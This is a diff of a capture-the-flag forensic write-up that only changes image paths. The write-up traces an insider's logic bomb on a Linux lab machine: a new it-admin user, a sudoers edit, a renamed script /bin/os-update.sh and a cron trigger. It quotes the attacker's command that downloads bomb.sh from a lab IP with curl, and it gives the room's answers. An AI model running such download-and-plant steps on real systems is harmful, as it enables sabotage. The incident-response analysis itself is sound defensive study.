@@ -15,23 +15,23 @@ Check it out!
 
 First i'll navigate into */var/log* directory to check what log files we were provided with.
 
-![](disgruntled1.png)
+![](images/disgruntled1.png)
 
 After checking *auth.log1* file i've found command that installed a package on the machine with root privileges.
 
-![](disgruntled2.png)
+![](images/disgruntled2.png)
 
 **Answer: /usr/bin/apt install dokuwiki**
 
 **Question 2: What was the present working directory (PWD) when the previous command was run?**
 
-![](disgruntled3.png)
+![](images/disgruntled3.png)
 
 **Answer: /home/cybert**
 
 **Question 3: Which user was created after the package from the previous task was installed?**
 
-![](disgruntled4.png)
+![](images/disgruntled4.png)
 
 **Answer: it-admin**
 
@@ -39,13 +39,13 @@ After checking *auth.log1* file i've found command that installed a package on t
 
 The *visudo* is called when editing the /etc/sudoers file. I've looked into the logs again and found the answer:
 
-![](disgruntled5.png)
+![](images/disgruntled5.png)
 
 **Answer: Dec 28 06:27:34**
 
 **Question 5: A script file was opened using the "vi" text editor. What is the name of this file?**
 
-![](disgruntled6.png)
+![](images/disgruntled6.png)
 
 **Answer: bomb.sh**
 
@@ -53,7 +53,7 @@ The *visudo* is called when editing the /etc/sudoers file. I've looked into the 
 
 From answering previous question i knew that user who opened bom.sh with *vi* was it-admin, so i've checked hist *.bash_history* file.
 
-![](disgruntled7.png)
+![](images/disgruntled7.png)
 
 **Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh**
 
@@ -61,7 +61,7 @@ From answering previous question i knew that user who opened bom.sh with *vi* wa
 
 There is no more interesting things in *.bash_history*, but knowing that the attacker used vim and that it may be used to renaming and moving files, i'm gonna check vim history file under */home/it-admin/.viminfo*.
 
-![](disgruntled8.png)
+![](images/disgruntled8.png)
 
 **Answer: /bin/os-update.sh**
 
@@ -69,9 +69,9 @@ There is no more interesting things in *.bash_history*, but knowing that the att
 
 I've navigated to the */bin* directory where os-update.sh file was moved. Then i've ran *ls -al --all-time* command.
 
-![](disgruntled9.png)
+![](images/disgruntled9.png)
 
-![](disgruntled10.png)
+![](images/disgruntled10.png)
 
 **Answer: Dec 28 06:29**
 
@@ -79,7 +79,7 @@ I've navigated to the */bin* directory where os-update.sh file was moved. Then i
 
 I've looked into a os-update.sh file and i found an answer.
 
-![](disgruntled11.png)
+![](images/disgruntled11.png)
 
 **Answer: goodbye.txt**
 
@@ -87,9 +87,9 @@ I've looked into a os-update.sh file and i found an answer.
 
 I looked into crontab and noticed the malicious script. I've copied the schedule expression and using https://crontab.guru/ converted it to know on which hour it gonna trigger.
 
-![](disgruntled12.png)
+![](images/disgruntled12.png)
 
-![](disgruntled13.png)
+![](images/disgruntled13.png)
 
 **Answer: 08:00 AM**
 
